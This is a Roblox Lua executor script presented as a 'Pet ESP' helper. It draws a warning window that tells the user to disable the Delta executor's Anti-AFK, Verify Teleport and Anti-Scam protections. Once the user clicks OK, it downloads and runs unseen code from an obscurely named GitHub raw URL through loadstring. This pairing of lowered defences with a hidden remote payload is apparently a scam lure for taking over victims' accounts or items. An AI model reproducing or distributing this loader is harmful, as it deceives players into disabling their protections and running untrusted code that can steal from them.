--// Delta Warning GUI (ZeoHub Style) + Pet ESP Script Merge //--

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local localPlayer = Players.LocalPlayer or Players:GetPlayers()[1]

-- Remove old GUI if exists
if CoreGui:FindFirstChild("DeltaWarning") then
    CoreGui.DeltaWarning:Destroy()
end

-- ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "DeltaWarning"
gui.Parent = CoreGui
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Main Frame
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 420, 0, 260)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.Position = UDim2.new(0.5, 0, 0.5, 0)
main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
main.BackgroundTransparency = 0.1
main.BorderSizePixel = 0
main.Parent = gui

-- Corner
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = main

-- Stroke
local stroke = Instance.new("UIStroke")
stroke.Parent = main
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(255, 0, 0)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 40)
title.Position = UDim2.new(0, 10, 0, 10)
title.BackgroundTransparency = 1
title.Text = "⚠️ Turn off all on Delta settings ⚠️"
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.Font = Enum.Font.FredokaOne
title.TextScaled = true
title.Parent = main

-- Instruction list
local instructions = Instance.new("TextLabel")
instructions.Size = UDim2.new(1, -20, 0, 120)
instructions.Position = UDim2.new(0, 10, 0, 60)
instructions.BackgroundTransparency = 1
instructions.Text = "1. Disable Anti-AFK\n2. Disable Verify Teleport\n3. Disable Anti-Scam"
instructions.TextColor3 = Color3.fromRGB(255, 255, 255)
instructions.TextXAlignment = Enum.TextXAlignment.Left
instructions.TextYAlignment = Enum.TextYAlignment.Top
instructions.Font = Enum.Font.FredokaOne
instructions.TextSize = 22
instructions.Parent = main

-- Checkbox text
local checkbox = Instance.new("TextLabel")
checkbox.Size = UDim2.new(1, -20, 0, 40)
checkbox.Position = UDim2.new(0, 10, 0, 180)
checkbox.BackgroundTransparency = 1
checkbox.Text = "☑ After disabling, press OK to continue."
checkbox.TextColor3 = Color3.fromRGB(255, 255, 255)
checkbox.Font = Enum.Font.FredokaOne
checkbox.TextSize = 20
checkbox.TextXAlignment = Enum.TextXAlignment.Left
checkbox.Parent = main

-- Okay button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 180, 0, 45)
button.Position = UDim2.new(0.5, -90, 1, -55)
button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
button.Text = "Okay"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Font = Enum.Font.FredokaOne
button.TextSize = 24
button.Parent = main

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 12)
btnCorner.Parent = button

local btnStroke = Instance.new("UIStroke")
btnStroke.Parent = button
btnStroke.Thickness = 2
btnStroke.Color = Color3.fromRGB(0, 150, 0)

button.MouseEnter:Connect(function()
    TweenService:Create(button,TweenInfo.new(0.2),{BackgroundColor3 = Color3.fromRGB(0,255,0)}):Play()
end)
button.MouseLeave:Connect(function()
    TweenService:Create(button,TweenInfo.new(0.2),{BackgroundColor3 = Color3.fromRGB(0,200,0)}):Play()
end)

-- When OK clicked → close warning and run ESP script
button.MouseButton1Click:Connect(function()
    TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Size = UDim2.new(0,0,0,0), BackgroundTransparency = 1}):Play()
    task.wait(0.4)
    gui:Destroy()

    -- Run Pet ESP script
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagDspawner/asda/refs/heads/main/asdas"))()
        
end)

-- Show animation
main.Size = UDim2.new(0, 0, 0, 0)
TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0,420,0,260)}):Play()
